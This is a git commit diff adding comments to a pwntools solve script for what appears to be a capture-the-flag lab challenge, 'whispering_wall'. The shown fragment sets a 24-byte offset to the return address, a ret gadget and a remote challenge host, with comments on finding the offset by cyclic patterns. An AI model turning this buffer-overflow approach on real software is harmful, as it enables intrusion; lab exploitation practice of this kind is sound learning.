9fe54e1d6555514b6b4d65320288e0e7f041ecda
gith-eng <135365698+gith-eng@users.noreply.github.com>
2026-04-19 21:26:34 +0200

    Comments

--- lab1_2recap/01_whispering_wall/solve.py
+++ lab1_2recap/01_whispering_wall/solve.py
@@ -1,7 +1,11 @@
 #!/usr/bin/env python3
 from pwn import *
 context.binary = elf = ELF('./whispering_wall', checksec=False)
+
+# rip offset found with #python3 -c "from pwn import *; print(cyclic(200)) as input + debugging
+# or try rip offset = buf (16B) + saved RPB (8B)
 OFFSET_TO_RIP = 24
+
 ret_gadget = 0x000000000040101a
 p = remote("offsec.m0lecon.it", 13513)
 p.recvuntil(b"whisper:")
